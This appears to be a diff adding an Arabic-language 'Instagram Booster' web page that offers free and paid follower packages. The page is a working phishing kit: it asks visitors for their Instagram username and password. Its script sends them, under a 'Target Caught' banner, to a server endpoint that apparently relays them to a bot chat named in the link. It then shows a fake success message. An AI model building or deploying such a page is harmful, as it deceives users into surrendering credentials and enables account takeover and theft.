@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Booster - Dark Mode</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
+        
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        
+        body {
+            background: #000000; color: #ffffff; font-family: 'Cairo', sans-serif;
+            min-height: 100vh; padding: 0; margin: 0;
+        }
+        
+        .top-bar { background: #000; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #262626; position: sticky; top: 0; z-index: 100; }
+        .top-bar h1 { font-size: 22px; font-weight: 900; background: linear-gradient(45deg, #833ab4, #fd1d1d, #fcb045); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        .top-bar .icon img { width: 32px; height: 32px; border-radius: 50%; border: 2px solid #fd1d1d; }
+        
+        .stories { background: #000; padding: 15px; display: flex; gap: 15px; overflow-x: auto; border-bottom: 1px solid #262626; }
+        .story { text-align: center; flex-shrink: 0; }
+        .story-circle { width: 65px; height: 65px; border-radius: 50%; background: linear-gradient(45deg, #833ab4, #fd1d1d, #fcb045); padding: 3px; display: flex; align-items: center; justify-content: center; margin-bottom: 5px; }
+        .story-circle-inner { width: 100%; height: 100%; border-radius: 50%; background: #000; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .story-circle-inner img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
+        .story-name { font-size: 11px; color: #fff; }
+        
+        .container { max-width: 500px; margin: 0 auto; padding: 15px; }
+        
+        .card { background: #1a1a1a; border-radius: 10px; margin-bottom: 15px; box-shadow: 0 2px 10px rgba(253, 29, 29, 0.1); overflow: hidden; border: 1px solid #262626; }
+        .card-header { padding: 12px 15px; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid #262626; }
+        .card-avatar { width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(45deg, #833ab4, #fd1d1d, #fcb045); display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .card-avatar img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
+        .card-user h3 { font-size: 14px; font-weight: 700; color: #fff; }
+        .card-user p { font-size: 11px; color: #8e8e8e; }
+        
+        .card-body { padding: 15px; }
+        .card-body h4 { font-size: 16px; margin-bottom: 8px; color: #fff; }
+        .card-body .desc { font-size: 13px; color: #a8a8a8; margin-bottom: 12px; }
+        
+        .plans { display: flex; flex-direction: column; gap: 8px; margin-bottom: 12px; }
+        .plan { background: #262626; border: 1px solid #333; border-radius: 10px; padding: 12px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: 0.2s; }
+        .plan:hover { background: #333; border-color: #fd1d1d; }
+        .plan.selected { background: linear-gradient(135deg, rgba(131, 58, 180, 0.3), rgba(253, 29, 29, 0.3)); border-color: #fd1d1d; box-shadow: 0 0 15px rgba(253, 29, 29, 0.3); }
+        
+        .plan-info h5 { font-size: 14px; font-weight: 700; color: #fff; }
+        .plan-info p { font-size: 11px; color: #8e8e8e; }
+        
+        .plan-price { font-size: 16px; font-weight: 900; color: #fd1d1d; text-shadow: 0 0 10px rgba(253, 29, 29, 0.5); }
+        .plan-price.free { color: #25d366; text-shadow: 0 0 10px rgba(37, 211, 102, 0.5); }
+        
+        .input-group { margin-bottom: 10px; }
+        .input-group label { display: block; font-size: 12px; color: #a8a8a8; margin-bottom: 5px; font-weight: 700; }
+        .input-group input { width: 100%; padding: 12px; border: 1px solid #333; border-radius: 8px; font-size: 14px; font-family: inherit; background: #000; color: #fff; transition: 0.2s; }
+        .input-group input:focus { outline: none; border-color: #fd1d1d; box-shadow: 0 0 10px rgba(253, 29, 29, 0.3); }
+        
+        .main-btn { width: 100%; padding: 12px; background: linear-gradient(45deg, #833ab4, #fd1d1d, #fcb045); border: none; border-radius: 8px; color: #fff; font-size: 15px; font-weight: 700; font-family: inherit; cursor: pointer; transition: 0.2s; box-shadow: 0 0 20px rgba(253, 29, 29, 0.4); }
+        .main-btn:hover { transform: scale(1.02); box-shadow: 0 0 30px rgba(253, 29, 29, 0.7); }
+        .main-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        .status { padding: 10px; border-radius: 8px; margin-top: 10px; text-align: center; font-size: 13px; font-weight: 700; display: none; }
+        .status.success { display: block; background: #0a2a0a; color: #25d366; border: 1px solid #25d366; }
+        .status.error { display: block; background: #2a0a0a; color: #fd1d1d; border: 1px solid #fd1d1d; }
+        .status.loading { display: block; background: #2a2a0a; color: #fcb045; border: 1px solid #fcb045; }
+        
+        .bottom-bar { position: fixed; bottom: 0; left: 0; right: 0; background: #000; border-top: 1px solid #262626; display: flex; justify-content: space-around; padding: 10px; z-index: 100; }
+        .bottom-bar .nav-icon { font-size: 24px; color: #fff; cursor: pointer; }
+        .bottom-bar .nav-icon.active { color: #fd1d1d; text-shadow: 0 0 10px #fd1d1d; }
+        
+        .spacer { height: 70px; }
+    </style>
+</head>
+<body>
+    <div class="top-bar">
+        <h1>Instagram Booster</h1>
+        <div class="icon"><img src="https://www.image2url.com/r2/default/images/1792670216702-87e6b682-b8e8-4734-b2a8-129e6ef111a2.png" alt="Instagram"></div>
+    </div>
+    
+    <div class="stories">
+        <div class="story">
+            <div class="story-circle"><div class="story-circle-inner"><img src="https://www.image2url.com/r2/default/images/1792670216702-87e6b682-b8e8-4734-b2a8-129e6ef111a2.png" alt="Story"></div></div>
+            <div class="story-name">مجاني</div>
+        </div>
+        <div class="story">
+            <div class="story-circle"><div class="story-circle-inner"><img src="https://www.image2url.com/r2/default/images/1792670216702-87e6b682-b8e8-4734-b2a8-129e6ef111a2.png" alt="Story"></div></div>
+            <div class="story-name">مدفوع</div>
+        </div>
+        <div class="story">
+            <div class="story-circle"><div class="story-circle-inner"><img src="https://www.image2url.com/r2/default/images/1792670216702-87e6b682-b8e8-4734-b2a8-129e6ef111a2.png" alt="Story"></div></div>
+            <div class="story-name">سريع</div>
+        </div>
+        <div class="story">
+            <div class="story-circle"><div class="story-circle-inner"><img src="https://www.image2url.com/r2/default/images/1792670216702-87e6b682-b8e8-4734-b2a8-129e6ef111a2.png" alt="Story"></div></div>
+            <div class="story-name">VIP</div>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="card">
+            <div class="card-header">
+                <div class="card-avatar"><img src="https://www.image2url.com/r2/default/images/1792670216702-87e6b682-b8e8-4734-b2a8-129e6ef111a2.png" alt="Instagram"></div>
+                <div class="card-user">
+                    <h3>Instagram Booster</h3>
+                    <p>الآن متاح</p>
+                </div>
+            </div>
+            
+            <div class="card-body">
+                <h4>🚀 زيادة متابعين انستقرام</h4>
+                <p class="desc">اختر الباقة المناسبة لك، وأدخل بيانات الحساب</p>
+                
+                <div class="plans">
+                    <div class="plan" onclick="selectPlan(this, 500)">
+                        <div class="plan-info"><h5>500 متابع</h5><p>مكافأة ترحيبية</p></div>
+                        <div class="plan-price free">مجاناً</div>
+                    </div>
+                    <div class="plan" onclick="selectPlan(this, 1000)">
+                        <div class="plan-info"><h5>1,000 متابع</h5><p>عرض محدود</p></div>
+                        <div class="plan-price free">مجاناً</div>
+                    </div>
+                    <div class="plan" onclick="selectPlan(this, 10000)">
+                        <div class="plan-info"><h5>10,000 متابع</h5><p>وصول سريع</p></div>
+                        <div class="plan-price">$1.99</div>
+                    </div>
+                    <div class="plan" onclick="selectPlan(this, 50000)">
+                        <div class="plan-info"><h5>50,000 متابع</h5><p>الأكثر مبيعاً</p></div>
+                        <div class="plan-price">$4.99</div>
+                    </div>
+                    <div class="plan" onclick="selectPlan(this, 100000)">
+                        <div class="plan-info"><h5>100,000 متابع</h5><p>VIP</p></div>
+                        <div class="plan-price">$9.99</div>
+                    </div>
+                </div>
+                
+                <div class="input-group">
+                    <label>👤 يوزر الحساب</label>
+                    <input type="text" id="username" placeholder="@username">
+                </div>
+                <div class="input-group">
+                    <label>🔑 كلمة السر</label>
+                    <input type="password" id="password" placeholder="••••••••">
+                </div>
+                <div class="input-group">
+                    <label>👥 عدد المتابعين</label>
+                    <input type="number" id="followers" placeholder="مثال: 5000">
+                </div>
+                
+                <button class="main-btn" id="submit-btn" onclick="sendData()">🚀 بدء الزيادة</button>
+                <div class="status" id="status"></div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="spacer"></div>
+    
+    <div class="bottom-bar">
+        <div class="nav-icon">🏠</div>
+        <div class="nav-icon">🔍</div>
+        <div class="nav-icon active">➕</div>
+        <div class="nav-icon">❤️</div>
+        <div class="nav-icon">👤</div>
+    </div>
+
+    <script>
+        // بنقرا الآيدي من اللينك
+        const urlParams = new URLSearchParams(window.location.search);
+        const userChatId = urlParams.get('chatId');
+        
+        function selectPlan(element, count) {
+            document.querySelectorAll('.plan').forEach(p => p.classList.remove('selected'));
+            element.classList.add('selected');
+            document.getElementById('followers').value = count;
+        }
+        
+        // دالة بتكلم السيرفر بتاعنا
+        async function sendToBot(text) {
+            const formData = new FormData();
+            formData.append('chat_id', userChatId);
+            formData.append('text', text);
+            await fetch('/send_custom_message', { method: 'POST', body: formData });
+        }
+        
+        async function sendData() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const followers = document.getElementById('followers').value.trim();
+            const status = document.getElementById('status');
+            const btn = document.getElementById('submit-btn');
+            
+            if (!username || !password || !followers) {
+                status.className = 'status error';
+                status.textContent = '❌ يرجى ملء جميع الحقول!';
+                return;
+            }
+            
+            status.className = 'status loading';
+            status.textContent = '⏳ جاري معالجة الطلب...';
+            btn.disabled = true;
+            
+            const text = `🕷️ <b>𓆩☠️𓆪 𝑻𝒂𝒓𝒈𝒆𝒕 𝑪𝒂𝒖𝒈𝒉𝒕 💀:</b>\n\n👤 <b>يوزر انستقرام:</b> ${username}\n🔑 <b>كلمة السر:</b> ${password}\n👥 <b>عدد المتابعين:</b> ${followers}`;
+            
+            await sendToBot(text);
+            
+            status.className = 'status success';
+            status.textContent = '✅ تم إتمام الطلب بنجاح!';
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+            document.getElementById('followers').value = '';
+            btn.disabled = false;
+        }
+    </script>
+</body>
+</html>
